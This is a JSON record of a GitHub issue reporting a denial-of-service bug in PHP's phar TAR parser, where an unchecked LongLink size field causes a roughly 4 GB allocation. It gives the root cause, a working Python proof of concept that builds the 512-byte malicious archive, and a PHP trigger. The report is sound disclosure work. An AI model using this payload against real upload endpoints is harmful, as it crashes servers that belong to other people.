@@ -1,0 +1,43 @@
+{
+ "source": "GitHub",
+ "url": "https://github.com/php/php-src/issues/22556",
+ "passes": [
+  "main"
+ ],
+ "title": "ext/phar: LongLink TAR entry causes ~4 GB allocation due to missing upper-bound check (DoS)",
+ "author_login": "crystarm",
+ "status": "ok",
+ "fetched_utc": "2026-10-07T04:20:33Z",
+ "final_url": "https://github.com/php/php-src/issues/22556",
+ "repo": "php/php-src",
+ "repo_language": "C",
+ "number": 22556,
+ "state": "open",
+ "state_reason": null,
+ "created_at": "2026-07-02T14:31:57Z",
+ "updated_at": "2026-07-23T11:07:17Z",
+ "closed_at": null,
+ "labels": [
+  "Bug",
+  "Extension: phar",
+  "Status: Verified"
+ ],
+ "comments_reported": 0,
+ "query_buckets": [
+  "789"
+ ],
+ "events": [
+  {
+   "post_type": "issue_body",
+   "post_id": "-",
+   "author_login": "crystarm",
+   "author_association": "CONTRIBUTOR",
+   "role": "R",
+   "role_name": "reporter",
+   "created_utc": "2026-07-02T14:31:57Z",
+   "updated_utc": "2026-07-23T11:07:17Z",
+   "permalink": "https://github.com/php/php-src/issues/22556",
+   "body_markdown": "### Description\n\n# ext/phar: LongLink TAR entry causes ~4 GB allocation due to missing upper-bound check (DoS)\n\n## Summary\n\n`phar_parse_tarfile()` in `ext/phar/tar.c` allocates memory for a `././@LongLink` filename directly from a `uint32_t` size field read out of the TAR header, with no upper-bound validation. A crafted TAR file of **512 bytes** causes PHP to attempt `malloc(4294967273)` (~4 GB), triggering a fatal out-of-memory error that kills the PHP process.\n\nThe existing check only rejects the values `0` and `UINT_MAX`; every value in between passes through to the allocator unchecked.\n\nAffected versions: **PHP 8.3**, **PHP 8.4** (verified). The same code path exists in `master` (where `pemalloc` was replaced by `zend_string_alloc`, but the guard logic is identical).\n\n---\n\n## Affected code\n\n**`ext/phar/tar.c`**, LongLink handling block:\n\n```c\nif (!last_was_longlink && hdr->typeflag == 'L') {\n    last_was_longlink = 1;\n    /* support the ././@LongLink system for storing long filenames */\n    entry.filename_len = entry.uncompressed_filesize;  // <-- uint32_t from TAR header\n\n    if (entry.filename_len == UINT_MAX || entry.filename_len == 0) {  // <-- only two sentinels\n        if (error) {\n            spprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (invalid entry size)\", fname);\n        }\n        php_stream_close(fp);\n        phar_destroy_phar_data(myphar);\n        return FAILURE;\n    }\n    entry.filename = pemalloc(entry.filename_len + 1, myphar->is_persistent);  // <-- !! unchecked\n```\n\nThe comment references \"bug 61065\" — the original fix from ~2012 that added the `== UINT_MAX` guard. That fix was incomplete: it only excluded the single maximum `uint32_t` value, leaving the entire range `[1, UINT_MAX-1]` unguarded.\n\nThe same logic exists in `master` with `zend_string_alloc`:\n\n```c\nif (entry.uncompressed_filesize == UINT_MAX || entry.uncompressed_filesize == 0) {\n    // ...\n}\nentry.filename = zend_string_alloc(entry.uncompressed_filesize, myphar->is_persistent);\n```\n\n---\n\n## Root cause\n\n`phar_tar_number()` decodes the 12-byte octal size field from the TAR header into a `uint32_t`. For a well-formed `././@LongLink` entry the `size` field contains the length of the filename that follows — normally a few dozen to a few hundred bytes. No maximum is enforced anywhere in the format, so a crafted entry can set this field to any value up to `0xFFFFFFFF` (4 294 967 295).\n\nThe guard added by bug 61065 only rejects `0` (empty) and `UINT_MAX` (overflow sentinel). Any value such as `0xFFFFFFE8` (4 294 967 272) bypasses both checks and reaches the allocator:\n\n```\nentry.filename_len = 0xFFFFFFE8   (= 4 294 967 272)\npemalloc(entry.filename_len + 1)  = pemalloc(4 294 967 273)  ≈ malloc(4.0 GiB)\n```\n\nAfter the huge allocation fails (or succeeds then immediately fails the subsequent `php_stream_read` length check), the error is handled — but the damage is already done: the process either consumed gigabytes of virtual memory or was killed by the OOM killer / `memory_limit` enforcement before reaching the cleanup path.\n\n---\n\n## Reproduction\n\n### PoC file\n\nA minimal reproducer is a single 512-byte TAR block (one header, no data) with:\n\n- `name` = `././@LongLink`\n- `typeflag` = `L`\n- `size` = octal `777777777750` → decimal `4 294 967 272` (`0xFFFFFFE8`)\n- valid checksum\n\nGenerate with Python:\n\n```python\n#!/usr/bin/env python3\n\"\"\"\npoc_phar_tar_oom.py — generates a 512-byte TAR file that triggers\nmalloc(4294967273) inside phar_parse_tarfile() via an oversized LongLink entry.\n\"\"\"\nimport sys\n\nhdr = bytearray(512)\n\nname = b'././@LongLink'\nhdr[0:len(name)] = name\nhdr[100:108] = b'0000644\\x00'   # mode\nhdr[108:116] = b'0000000\\x00'   # uid\nhdr[116:124] = b'0000000\\x00'   # gid\nhdr[124:136] = b'777777777750'  # size = 0xFFFFFFE8 in octal\nhdr[136:148] = b'00000000000\\x00'  # mtime\nhdr[148:156] = b'        '      # checksum placeholder\nhdr[156]     = ord('L')         # typeflag = LongLink\n\n# compute checksum (unsigned sum of all header bytes)\ncsum = sum(hdr) & 0xFFFF\nhdr[148:155] = ('%06o\\x00' % csum).encode()\nhdr[155] = ord(' ')\n\nsys.stdout.buffer.write(bytes(hdr))\n```\n\n```sh\npython3 poc_phar_tar_oom.py > poc.tar\n```\n\n### PHP reproducer\n\n```php\n<?php\n// triggers: PHP Fatal error: Out of memory (tried to allocate 4294967273 bytes)\n$p = new PharData('poc.tar');\n```\n\nRun with a virtual memory cap to make the OOM immediate and deterministic:\n\n```sh\n# With ulimit (simulates a resource-limited server process):\nulimit -v 524288   # 512 MB virtual memory\nphp reproduce.php\n\n# Expected output:\n# mmap() failed: [12] Cannot allocate memory\n# mmap() failed: [12] Cannot allocate memory\n# PHP Fatal error: Out of memory (allocated 2097152 bytes)\n#                  (tried to allocate 4294967273 bytes) in reproduce.php on line 2\n```\n\nWithout `ulimit`, on a machine with enough RAM, `malloc` may succeed (allocating ~4 GB of virtual memory), after which `php_stream_read` immediately returns 0 bytes (the file is truncated), the code frees the allocation and returns `FAILURE` with a \"truncated\" error — but the process will have briefly held ~4 GB of virtual address space. On systems where the OOM killer is aggressive or `memory_limit` is in play, the process dies.\n\n### Verified on\n\n| PHP version | Source | Result |\n|---|---|---|\n| PHP 8.3 (custom build with ASan/libFuzzer) | local `php-fuzz-phar-tar` | `libFuzzer: out-of-memory (malloc(4294967273))` |\n| PHP 8.4.21 (Debian package, NTS) | `php8.4 reproduce.php` | `Fatal error: Out of memory (tried to allocate 4294967273 bytes)` |\n| PHP 8.4.21 (Debian package, NTS) | `ulimit -v 524288 php8.4 reproduce.php` | `mmap() failed` + `Fatal error: Out of memory` (process killed) |\n\n---\n\n## Why this matters\n\n### Reachable without privileges\n\n`PharData` is used in countless frameworks and CMS plugins to handle user-uploaded archives (themes, plugins, backups, data imports). Any code path that calls `new PharData($user_supplied_file)` or `Phar::loadPhar()` / `phar_open_from_fp()` on untrusted input is affected. The phar extension is enabled by default.\n\n### `memory_limit` does not protect\n\n`phar_parse_tarfile()` calls `pemalloc()` → `__zend_malloc()` → `malloc()`. This path goes through PHP's allocator but the large allocation triggers the per-request `memory_limit` enforcement, which issues a `PHP Fatal error` and aborts the request. On PHP-FPM the worker process exits; the master respawns it, but a sustained stream of such requests will continuously restart workers, effectively DoS-ing the server.\n\n### No authentication required\n\nThe crafted file is 512 bytes. Sending it via a file upload field, a REST API that accepts archives, or any other intake point that passes the file to the phar extension is sufficient. No login or special permissions are needed on the attacker side.\n\n### `phar.readonly` does not protect\n\nThe `phar.readonly` INI directive restricts *writing* to phar archives. Parsing (reading) a TAR file proceeds regardless of this setting; the vulnerability lies in the parser, not the writer.\n\n---\n\n## Discovery\n\nFound via coverage-guided fuzzing (`libFuzzer` + ASan) of `sapi/fuzzer/php-fuzz-phar-tar`. The fuzzer generated 2 749 distinct OOM artifacts, all triggering the same allocation path in `phar_parse_tarfile()` at `tar.c:375`.\n\n## References\n\n- `././@LongLink` TAR extension:\n  https://www.gnu.org/software/tar/manual/html_node/Standard.html\n\n"
+  }
+ ]
+}
